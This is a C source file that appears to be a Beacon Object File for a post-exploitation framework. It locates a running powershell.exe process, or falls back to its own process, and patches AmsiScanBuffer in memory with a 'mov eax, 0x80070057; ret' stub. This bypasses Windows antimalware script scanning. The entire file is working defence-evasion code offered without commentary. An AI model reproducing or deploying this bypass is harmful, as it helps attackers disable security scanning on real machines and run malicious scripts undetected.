#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD,DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$Process32Next(HANDLE,LPPROCESSENTRY32);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE ,LPVOID,LPCVOID,SIZE_T,SIZE_T);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$Process32First(HANDLE,LPPROCESSENTRY32);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD KERNEL32$GetCurrentProcessId(VOID);
WINBASEAPI int __cdecl MSVCRT$_stricmp(const char *string1,const char *string2);
WINBASEAPI int __cdecl MSVCRT$printf(const char * _Format,...);


DWORD GetPid(const char * pName) {
	
	PROCESSENTRY32 pEntry;
	HANDLE snapshot;

	pEntry.dwSize = sizeof(PROCESSENTRY32);
	snapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (KERNEL32$Process32First(snapshot, &pEntry) == TRUE) {
		while (KERNEL32$Process32Next(snapshot, &pEntry) == TRUE) {
			if (MSVCRT$_stricmp(pEntry.szExeFile, pName) == 0) {
				return pEntry.th32ProcessID;
			}
		}
	}
	KERNEL32$CloseHandle(snapshot);
	return 0;
}

void patchAmsiScanBuffer(DWORD pid) {
	HANDLE hProc = NULL;
	SIZE_T bytes;
	hProc = KERNEL32$OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
	PVOID amsiScanBuffAddr = KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
	unsigned char amsiScanBuffBypass[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
	BOOL success = KERNEL32$WriteProcessMemory(hProc, amsiScanBuffAddr, (PVOID)amsiScanBuffBypass, sizeof(amsiScanBuffBypass), &bytes);
	
	if (!success) {
		MSVCRT$printf("\nFail - Could not patch AmsiScanBuffer in remote process: PID:%d", pid);
	}
	KERNEL32$CloseHandle(hProc);
}

void go(char* args, int len) {
	DWORD dwPid = 0;
	
	dwPid = GetPid("powershell.exe");
	if (dwPid == 0)
			dwPid = KERNEL32$GetCurrentProcessId();
	
	patchAmsiScanBuffer(dwPid);
}
